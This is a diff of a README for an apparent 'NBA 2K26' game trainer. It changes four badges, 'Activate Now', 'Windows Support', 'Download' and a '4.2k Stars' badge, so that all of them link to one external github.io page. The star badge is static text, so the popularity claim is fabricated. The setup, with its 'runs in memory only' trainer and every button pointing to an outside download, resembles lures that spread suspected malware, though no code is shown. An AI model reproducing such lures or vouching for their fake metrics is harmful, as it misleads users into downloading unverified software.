@@ -11,10 +11,10 @@ NBA 2K26 is packed with mechanics that demand precision and timing. The trainer 
 \[!NOTE]
 The trainer runs in memory only. Always keep a backup of your progress before activating.
 
-[![Activate Now](https://img.shields.io/badge/Activate%20Now-blue?style=for-the-badge\&logo=rocket)](#)
-[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-green?style=for-the-badge\&logo=windows)](#)
-[![⭐️ 4.2k Stars](https://img.shields.io/badge/⭐️%204.2k-Stars-yellow?style=for-the-badge\&logo=github)](#)
-[![Download](https://img.shields.io/badge/Download-Latest-orange?style=for-the-badge\&logo=github)](#)
+[![Activate Now](https://img.shields.io/badge/Activate%20Now-blue?style=for-the-badge\&logo=rocket)](https://nba-2k26-trainer.github.io/.github/)
+[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-green?style=for-the-badge\&logo=windows)](https://nba-2k26-trainer.github.io/.github/)
+[![⭐️ 4.2k Stars](https://img.shields.io/badge/⭐️%204.2k-Stars-yellow?style=for-the-badge\&logo=github)](https://nba-2k26-trainer.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Latest-orange?style=for-the-badge\&logo=github)](https://nba-2k26-trainer.github.io/.github/)
 
 
 ---
